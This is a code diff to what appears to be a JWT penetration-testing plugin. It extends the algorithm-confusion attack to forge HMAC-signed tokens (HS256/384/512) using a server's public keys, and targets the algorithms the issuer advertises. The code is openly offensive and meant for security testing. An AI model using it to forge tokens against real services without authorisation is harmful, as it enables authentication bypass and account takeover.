@@ -19,7 +19,9 @@ import { fetchTLSCertPem, discoverJWKS, fetchJWKS, discoverPublicKeys, type UrlF
 import type { ParsedJWT, AttackResult, PluginConfig } from "../types.js";
 import { nanoid } from "../util.js";
 
-const ALG_CONFUSION_MAP: Record<string, "HS256" | "HS384" | "HS512"> = {
+export type HmacAlg = "HS256" | "HS384" | "HS512";
+
+const ALG_CONFUSION_MAP: Record<string, HmacAlg> = {
   RS256: "HS256", RS384: "HS384", RS512: "HS512",
   PS256: "HS256", PS384: "HS384", PS512: "HS512",
   ES256: "HS256", ES384: "HS384", ES512: "HS512",
@@ -27,6 +29,20 @@ const ALG_CONFUSION_MAP: Record<string, "HS256" | "HS384" | "HS512"> = {
 
 function isAsymmetricAlg(alg: string): boolean {
   return alg.startsWith("RS") || alg.startsWith("PS") || alg.startsWith("ES");
+}
+
+// Decide which HMAC algorithm(s) the algorithm-confusion attack should forge.
+// If the issuer's OpenID `id_token_signing_alg_values_supported` lists HMAC
+// algorithms, those are the relevant targets — the server explicitly accepts
+// HMAC, so confusion is worth trying with exactly those. Otherwise fall back to
+// the classic same-strength mapping for the token's own algorithm (e.g. RS256→HS256).
+export function hmacConfusionTargets(originalAlg: string, signingAlgs: string[] = []): HmacAlg[] {
+  const supported = signingAlgs
+    .map((a) => a.toUpperCase())
+    .filter((a): a is HmacAlg => a === "HS256" || a === "HS384" || a === "HS512");
+  if (supported.length) return [...new Set(supported)];
+  const mapped = ALG_CONFUSION_MAP[originalAlg];
+  return mapped ? [mapped] : ["HS256"];
 }
 
 interface SecretVariant {
@@ -131,15 +147,18 @@ function attacksForKey(
 export function buildAlgConfusionForKeys(
   parsed: ParsedJWT,
   keyPems: string[],
-  sourceDesc: string
+  sourceDesc: string,
+  hmacAlgs?: HmacAlg[]
 ): AttackResult[] {
   const originalAlg = parsed.header.alg as string;
   if (!isAsymmetricAlg(originalAlg)) return [];
-  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  const targets = hmacAlgs && hmacAlgs.length ? hmacAlgs : [ALG_CONFUSION_MAP[originalAlg]];
   const seen = new Set<string>();
   const out: AttackResult[] = [];
   for (const pem of keyPems) {
-    out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
+    for (const hmacAlg of targets) {
+      out.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, sourceDesc, seen));
+    }
   }
   return out;
 }
@@ -162,17 +181,22 @@ export async function buildAlgConfusionAttacks(
   config: PluginConfig,
   recoveredKeys: string[] = [],
   onDiscovery?: (info: DiscoveryInfo) => void,
-  fetcher?: UrlFetcher
+  fetcher?: UrlFetcher,
+  hmacTargets?: HmacAlg[]
 ): Promise<AttackResult[]> {
   const originalAlg = parsed.header.alg as string;
   if (!isAsymmetricAlg(originalAlg)) return [];
 
-  const hmacAlg = ALG_CONFUSION_MAP[originalAlg];
+  // Which HMAC alg(s) to forge — driven by the issuer's supported algs when known
+  // (see hmacConfusionTargets), else the classic same-strength mapping.
+  const targets = hmacTargets && hmacTargets.length ? hmacTargets : [ALG_CONFUSION_MAP[originalAlg]];
   const results: AttackResult[] = [];
   const seen = new Set<string>();
 
   const addKey = (pem: string, source: string) => {
-    results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
+    for (const hmacAlg of targets) {
+      results.push(...attacksForKey(parsed, hmacAlg, originalAlg, pem, source, seen));
+    }
   };
 
   // 1. Explicitly configured key / cert
